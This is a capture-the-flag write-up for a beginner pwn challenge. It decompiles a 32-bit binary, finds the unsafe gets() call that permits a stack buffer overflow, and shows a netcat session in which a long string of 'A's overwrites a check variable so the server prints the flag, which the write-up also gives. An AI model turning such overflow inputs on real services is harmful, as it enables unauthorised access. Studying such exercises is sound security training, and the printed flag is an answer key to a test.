# Pwn 50 - Mitch 

We are given a binary called isMitch and a a netcat server:
```nc 40.76.33.15 12345```

We can run ```file isMitch``` to see that it is a 32 bit binary executable

```isMitch: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=755b5a21168f49efe37d6fef810521cb9d675015, not stripped```

The disassembler (with a decompiler plugin) I use is IDA-Pro. However, tools like objdump, retdec.com, hopper, and radare2 all work too.

The pseudocode decompiled with IDA Hexrays is as follows:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int s; // [esp+0h] [ebp-4Eh]
  __int16 v5; // [esp+4h] [ebp-4Ah]
  int v6; // [esp+2Eh] [ebp-20h]
  int v7; // [esp+32h] [ebp-1Ch]
  int *v8; // [esp+42h] [ebp-Ch]

  v8 = &argc;
  setbuf(_bss_start, 0);
  print_header();
  s = 0;
  v6 = 0;
  memset(
    (void *)((unsigned int)&v5 & 0xFFFFFFFC),
    0,
    4 * (((unsigned int)((char *)&s - ((unsigned int)&v5 & 0xFFFFFFFC) + 50) & 0xFFFFFFFC) >> 2));
  v7 = 0;
  gets((char *)&s);
  if ( v7 )
  {
    printf(
      "Thats very impressive, \x1B[0;33m%s\x1B[0m.\n"
      " You have joined the elite ranks of the Purdue Presidents. Now continue on your journey to learn about the \x1B[1;"
      "31mhacks\x1B[0m\n"
      "\n",
      &s);
    print_flag();
  }
  else
  {
    printf("Sorry I can't do anything for you \x1B[0;33m%s\x1B[0m, you're not \x1B[0;32mMitch\x1B[0m!\n", &s);
  }
  return 0;
}
```

The important parts are:
```C
v7 = 0;
  gets((char *)&s);
  if ( v7 )
  {
    printf(
      "Thats very impressive, \x1B[0;33m%s\x1B[0m.\n"
      " You have joined the elite ranks of the Purdue Presidents. Now continue on your journey to learn about the \x1B[1;"
      "31mhacks\x1B[0m\n"
      "\n",
      &s);
    print_flag();
  }
```

We can see that if v7 is non zero, then the flag gets printed. The program also uses a gets() call, which provides us with a buffer overflow to modify the v7 variable. Thus, we can just spam characters, and v7 will be edited to a non-zero value and the flag will be printed.

Of course, we have to do this with the netcat server for the flag on the server to be printed:

```
alex@WINDOWS-0A3VRFK:/mnt/c/Users/alex/Desktop/CTF$ nc 40.76.33.15 12345

So you want to learn how to hack...
Well you see only Mitch Daniels can learn the secret to the hax and I don't think you're Mitch so I dont know if I can help you
Give me your name anyway
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Thats very impressive, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
 You have joined the elite ranks of the Purdue Presidents. Now continue on your journey to learn about the hacks

b0ctf{y0u_4r3_M1tch_d4nie1$$$}
```

## Flag
### b0ctf{y0u_4r3_M1tch_d4nie1$$$}
